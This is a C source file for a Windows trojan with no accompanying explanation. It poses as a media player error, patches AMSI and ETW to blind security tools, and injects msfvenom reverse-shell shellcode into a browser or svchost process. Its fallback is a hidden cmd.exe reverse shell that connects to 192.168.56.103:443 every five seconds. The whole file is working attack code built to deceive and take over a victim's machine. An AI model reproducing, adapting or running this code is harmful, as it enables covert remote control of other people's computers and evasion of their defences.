#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>

BOOL process_injection(DWORD pid, unsigned char* code, SIZE_T code_size) {
    HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!process_handle) return FALSE;

    LPVOID remote_buffer = VirtualAllocEx(process_handle, NULL, code_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_buffer) {
        CloseHandle(process_handle);
        return FALSE;
    }

    if (!WriteProcessMemory(process_handle, remote_buffer, code, code_size, NULL)) {
        VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(process_handle);
        return FALSE;
    }

    HANDLE thread_handle = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
    if (!thread_handle) {
        CloseHandle(process_handle);
        return FALSE;
    }

    CloseHandle(thread_handle);
    CloseHandle(process_handle);
    return TRUE;
}

DWORD get_target_pid() {
    DWORD pid = 0;
    const char* target_process[] = {"chrome.exe", "svchost.exe", "msedge.exe"};

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    for (int i = 0; i < 3; i++) {
        if (Process32First(snapshot, &pe32)) {
            do {
                if (stricmp(pe32.szExeFile, target_process[i]) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &pe32));
        }
        if (pid != 0) break;
    }
    CloseHandle(snapshot);
    return pid;
}

void patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (amsi == NULL) return;

    void* api_address = GetProcAddress(amsi, "AmsiScanBuffer");
    if (api_address == NULL) return;

    DWORD old_protect;
    VirtualProtect(api_address, 6, PAGE_EXECUTE_READWRITE, &old_protect);

    // mov eax,0x80070057
    // c3
    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    memcpy(api_address, patch, sizeof(patch));

    VirtualProtect(api_address, 6, old_protect, &old_protect);
}

void patch_etw() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll == NULL) return;

    void* api_address = GetProcAddress(ntdll, "EtwEventWriteTransfer");
    if (api_address == NULL) return;

    DWORD old_protect;
    VirtualProtect(api_address, 3, PAGE_EXECUTE_READWRITE, &old_protect);

    // xor eax,eax
    // c3
    unsigned char patch[] = {0x31, 0xC0, 0xC3};
    memcpy(api_address, patch, sizeof(patch));

    VirtualProtect(api_address, 3, old_protect, &old_protect);
}

void connect_shell() {
    WSADATA wsa;
    SOCKET socket;
    struct sockaddr_in address;
    char *ip = "192.168.56.103";
    int port = 443;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;

    while(1) {
        socket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        address.sin_family = AF_INET;
        address.sin_port = htons(port);
        inet_pton(AF_INET, ip, &address.sin_addr);
        if (WSAConnect(socket, (SOCKADDR*)&address, sizeof(address), NULL, NULL, NULL, NULL) == 0) {
            STARTUPINFO startup_info = {0};
            PROCESS_INFORMATION process_info = {0};
            startup_info.cb = sizeof(startup_info);
            startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)socket;
            startup_info.wShowWindow = SW_HIDE;

            CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &process_info);
            WaitForSingleObject(process_info.hProcess, INFINITE);
        }
        closesocket(socket);
        Sleep(5000);
    }
}

int main() {
    MessageBox(NULL, "Error: The video file is corrupted or required codec (0xC004F011) is missing.", "Media Player Error", MB_ICONERROR | MB_OK);
    
    DWORD pid = get_target_pid();
    if (pid == 0) {
        return 1;
    }

    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR IP LPORT=443 -f c
    // end with \xc3
    unsigned char shellcode[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
    "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
    "\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x67"
    "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
    "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
    "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
    "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
    "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
    "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
    "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
    "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
    "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
    "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
    "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
    "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
    "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
    "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
    "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\xc3";

    patch_amsi();
    patch_etw();
    SIZE_T shellcode_size = sizeof(shellcode) - 1;
    if (process_injection(pid, shellcode, shellcode_size)) {
        ExitProcess(0);
    } else {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        connect_shell();
    }
    return 0;
}